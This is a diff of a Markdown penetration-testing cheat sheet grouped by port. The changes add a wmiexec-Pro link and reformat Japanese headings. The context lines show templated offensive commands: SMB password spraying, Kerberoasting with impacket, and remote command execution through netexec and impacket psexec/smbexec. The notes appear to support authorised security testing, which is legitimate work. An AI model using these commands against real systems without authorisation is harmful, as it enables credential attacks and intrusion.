@@ -4,7 +4,7 @@
 
 
 ## 135
-
+https://github.com/XiaoliChan/wmiexec-Pro
 
 ## 389
 ### netexec
@@ -45,7 +45,8 @@ impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME
 
 
 ## 445
-### netexec(rpcを使用するためTCP135番も使う)
+### netexec
+(rpcを使用するためTCP135番も使う)
 ```sh
 # Password Spraying
 netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
@@ -86,7 +87,8 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x '
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
 ```
 
-### impacket(rpcを使用するためTCP135番も使う)
+### impacket
+(rpcを使用するためTCP135番も使う)
 ```sh
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
